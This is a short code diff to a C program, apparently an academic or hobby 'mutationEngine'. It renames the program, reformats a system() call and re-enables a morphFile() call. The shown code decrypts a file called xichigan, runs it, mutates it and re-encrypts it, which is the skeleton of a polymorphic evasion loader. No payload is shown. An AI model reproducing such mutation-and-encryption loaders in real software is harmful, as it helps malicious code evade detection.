@@ -1,11 +1,11 @@
-#include "start.h"
+#include "mutationEngine.h"
 
 /*********************************************************************************
 * Author: Laine Rumreich								       				 				   *
 *																				 							*
 *																				 							*
 * How to compile: make										 					 					*
-* How to run: start                    									 	 				*
+* How to run: mutationEngine                 							 	 				*
 **********************************************************************************/
 
 int main(int argc, char*argv[]) {
@@ -28,7 +28,7 @@ int main(int argc, char*argv[]) {
 	/* 
 		Once the file is decrypted, start xichigan running
 	*/
-	system ("xichigan");
+	system("xichigan");
 
 	// Wait for xichigan to finish
 	wait(&status);
@@ -49,7 +49,7 @@ int main(int argc, char*argv[]) {
 	*/
 
 	// Morph the file xichigan
-	//morphFile();
+	morphFile();
 
 	// Encrypt the file xichigan
 	decryptFile(key); // Symmetric key; so 'decrypt' is encrypt as well
